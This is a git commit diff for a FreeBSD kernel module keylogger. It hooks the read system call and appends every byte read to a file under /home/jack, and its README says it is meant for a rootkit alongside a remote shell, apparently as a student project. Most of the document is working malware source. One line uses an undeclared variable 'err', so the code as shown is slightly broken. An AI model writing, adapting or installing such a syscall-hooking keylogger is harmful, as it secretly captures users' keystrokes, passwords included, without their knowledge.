9c86d7fc13d06d2e88c8ab9b352b7bf1654a8a6b
Jack Gifford <shmacktus@gmail.com>
2019-06-27 21:41:54 +1000

    Finished keylogger

---
+++ keylog/README.md
@@ -0,0 +1,8 @@
+# Keylogger
+
+This is a keylogger that writes all key presses from stdin to 
+/home/jack/test.txt
+
+This combined with the remote shell is the capabilities I want
+from my rootkit for my something awesome project.
+
--- keylog/keylog.c
+++ keylog/keylog.c
@@ -12,6 +12,12 @@
 #include <sys/syscallsubr.h>
 #include <sys/stat.h>
 #include <sys/fcntl.h>
+#include <sys/unistd.h>
+
+#include <sys/sx.h>
+
+static int write_hook(struct thread *td, struct write_args *uap);
+static struct sx file_lock;
 
 static int read_hook(struct thread *td, void *syscall_args)
 {
@@ -20,6 +26,7 @@ static int read_hook(struct thread *td, void *syscall_args)
 	
 	int error;
 	char buf[1];
+	//buf[1] = '\n';
 	size_t done;
 
 	error = sys_read(td, syscall_args);
@@ -29,26 +36,62 @@ static int read_hook(struct thread *td, void *syscall_args)
 		return error;
 	
 	copyinstr(uap->buf, buf, 1, &done);
-	printf("%c\n", buf[0]);
+
+	sx_xlock(&file_lock);
+
+	struct write_args w_args;
+
+	// sys_open is a wrapper around kern_openat for processes from userspace, we bypass that.
+	kern_openat(td, AT_FDCWD, "/home/jack/test.txt", UIO_SYSSPACE, O_RDWR | O_CREAT | O_APPEND, 0777 );
+	w_args.fd = td->td_retval[0];
+	w_args.buf = (void *)buf;
+	w_args.nbyte = 1;
+
+	// Ignore errors we don't care about them :P
+	write_hook(td, &w_args);
+
+	// Write a '\n' after. 
+	buf[0] = '\n';
+	err = write_hook(td, &w_args);
+
+	kern_close(td, w_args.fd);
+
+	sx_xunlock(&file_lock);
+
+	return error;
+}
+
+// This is pretty much the same as what the actual sys_write looks like
+// the only difference is we set uio_segflg to UIO_SYSSPACE 
+static int write_hook(struct thread *td, struct write_args *uap)
+{
+	struct uio auio;
+	struct iovec aiov;
+
+	int error;
+
+	aiov.iov_base = (void *)(uintptr_t)uap->buf;
+	aiov.iov_len = uap->nbyte;
+
+	auio.uio_iov = &aiov;
+	auio.uio_iovcnt = 1;
+	auio.uio_resid = uap->nbyte;
+	auio.uio_segflg = UIO_SYSSPACE;
+
+	error = kern_writev(td, uap->fd, &auio);
 
 	return error;
 }
 
 
-static int setup()
-{
-	return kern_openat(curthread, AT_FDCWD, "/home/jack/test.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR );
-}
 
 static int load (struct module *module, int cmd, void *args)
 {
 	int error = 0;
-	int res = 0;
 
 	switch (cmd) {
 		case MOD_LOAD: 
-			res = setup();
-			printf("%d\n", res);
+			sx_init(&file_lock, "lock");
 			sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
 			break;
 
